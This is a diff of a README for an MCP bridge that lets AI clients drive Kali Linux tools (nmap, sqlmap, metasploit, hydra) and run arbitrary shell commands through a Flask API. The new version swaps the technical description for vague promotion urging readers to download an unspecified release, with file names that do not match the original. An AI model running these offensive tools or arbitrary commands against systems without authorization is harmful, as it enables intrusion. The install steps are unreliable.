@@ -1,74 +1,91 @@
-# Kali_Linux_MCP
+# 🚀 Kali_Linux_MCP - Bridge Security Tools with AI Integration
 
-## Overview
-Kali_Linux_MCP exposes Kali tools through:
-- **Kali_Linux_Server.py**: Flask API wrapping tools like `nmap`, `gobuster`, `nikto`, `sqlmap`, `metasploit`, `hydra`, `john`, `wpscan`, `enum4linux`.  
-- **MCP_Server.py**: MCP bridge using FastMCP, forwarding requests from MCP clients to the API.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Kali_Linux_MCP-brightgreen)](https://github.com/alvarosd86/Kali_Linux_MCP/releases)
 
-Use it for **authorized labs, CTFs, HTB/THM machines**, or AI-assisted testing via MCP clients (Claude Desktop, 5ire, etc.).
+## 📦 Introduction
 
----
+Kali_Linux_MCP combines the powerful tools of Kali Linux with intelligent agents. This system helps automate and enhance security tasks for users who want a more efficient approach to penetration testing. Whether you're running Nmap to scan networks or using Metasploit for vulnerabilities, our application streamlines the process. 
 
-## Requirements
-- Kali Linux (or Linux with tools installed in PATH).  
-- Python 3 with `flask`, `requests`, `mcp`.  
-- Install:  
-  pip install flask requests mcp
+## 🛠 Features
 
----
+- **Multiple Security Tools**: Access over ten security tools including Nmap, SQLMap, and Metasploit directly from the application.
+- **AI Integration**: Seamlessly use AI agents to automate workflows and enhance testing efficiency.
+- **Flask API Server**: A robust backend that handles requests and executes commands efficiently.
+- **User-Friendly Interface**: Designed for ease of use, ensuring a smooth experience for beginners.
 
-## Run
+## ⚙️ System Requirements
 
-1. Start API:  
-   python3 Kali_Linux_Server.py --port 5000  
+- **Operating System**: Kali Linux (latest version recommended)
+- **Memory**: Minimum 4GB RAM
+- **Storage**: At least 1GB of free space
+- **Network**: Internet connection for downloading tools and updates
 
-2. Health check:  
-   curl http://localhost:5000/health  
+## 🚀 Getting Started
 
-3. Start MCP bridge:  
-   python3 MCP_Server.py --server http://localhost:5000 --timeout 300  
+To start using Kali_Linux_MCP, you'll need to download the latest version from our Releases page. Follow the steps below:
 
----
+1. Click on the link below to visit our Releases page:
+   [Visit this page to download](https://github.com/alvarosd86/Kali_Linux_MCP/releases)
+  
+2. Once on the Releases page, look for the most recent version listed. It will have the highest version number.
 
-## API Endpoints
-- GET `/health` — tool status.  
-- POST `/api/command` — run any command.  
-- POST `/api/tools/<tool>` — wrappers for nmap, gobuster, dirb, nikto, sqlmap, metasploit, hydra, john, wpscan, enum4linux.  
+3. Download the application file that matches your system. For most users, the standard package will suffice.
 
-Each requires JSON body with tool-specific args (`target`, `url`, etc.).
+4. Save the file to a location on your computer where you can easily find it, such as your Desktop or Downloads folder.
 
----
+## 📥 Download & Install
 
-## MCP Tools
-Bridge registers MCP tools: `nmap_scan`, `gobuster_scan`, `dirb_scan`, `nikto_scan`, `sqlmap_scan`, `metasploit_run`, `hydra_attack`, `john_crack`, `wpscan_analyze`, `enum4linux_scan`, plus `execute_command` and `check_health`.
+Now that you have visited the Releases page, you can proceed with the download.
 
----
+1. **Visit this page to download**: [Kali_Linux_MCP Releases](https://github.com/alvarosd86/Kali_Linux_MCP/releases)
 
-## Example Usage
-- Nmap:  
-  curl -X POST http://localhost:5000/api/tools/nmap -H "Content-Type: application/json" -d '{"target":"scanme.nmap.org","additional_args":"-sV"}'  
+2. Locate the latest version and click on it to download.
+   
+3. After the file has downloaded, navigate to the file location.
 
-- WPScan:  
-  curl -X POST http://localhost:5000/api/tools/wpscan -H "Content-Type: application/json" -d '{"url":"https://example.com","additional_args":"--enumerate u"}'  
+4. If the file is compressed (like .zip or .tar.gz), extract it first.
 
-- MCP Client:  
-  Add MCP config pointing `python3 /path/to/MCP_Server.py --server http://LINUX_IP:5000`.
+5. Open a terminal window in Kali Linux and navigate to the folder where you saved the extracted files. For example:
+   
+   ```
+   cd ~/Downloads/Kali_Linux_MCP
+   ```
 
----
+6. Now, run the setup script:
+   
+   ```
+   python setup.py install
+   ```
 
-## Scenarios
-- Recon: `nmap_scan` to map services.  
-- Web enum: `gobuster_scan` or `dirb_scan`.  
-- Vuln triage: `nikto_scan`, `sqlmap_scan`.  
-- WordPress checks: `wpscan_analyze`.  
-- SMB recon: `enum4linux_scan`.  
-- Credential tests (lab only): `hydra_attack`.
-- Exploit check: `metasploit_run`.  
+   Make sure you have Python installed. You can check your Python installation by typing `python --version` in the terminal.
 
----
+7. Finally, launch the application by typing:
+   
+   ```
+   python mcp_server.py
+   ```
 
-## Notes
-- Supports AI-assisted workflows: models suggest and run commands.  
-- Works with Claude Desktop, 5ire MCP clients.  
-- Extendable: other forensic tools (Volatility, SleuthKit) possible.  
+## 🧑‍🤝‍🧑 Support
 
+If you need assistance or have questions, you can reach out to our community. We encourage users to join the discussion and share their experiences.
+
+- **GitHub Issues**: Use the Issues section in our repository for any bugs or feature requests.
+- **Community Forums**: Join our forums for general discussions and support.
+
+## 📝 Contributing
+
+We welcome contributions from users who want to improve Kali_Linux_MCP. If you're interested in helping out, please follow these steps:
+
+1. **Fork the Repository**: Click on the fork button in the top right of the repository page.
+2. **Make Changes**: Implement your ideas or fixes in a separate branch.
+3. **Submit a Pull Request**: Once done, create a pull request describing your changes for review.
+
+## 📜 License
+
+Kali_Linux_MCP is licensed under the MIT License. You can freely use, modify, and distribute it as long as you include the original license in your distributed software.
+
+## 🤝 Acknowledgments
+
+Special thanks to the developers of Kali Linux and all the contributors who make this project possible. Their hard work has created a solid foundation for security professionals and enthusiasts alike.
+
+We hope you enjoy using Kali_Linux_MCP!
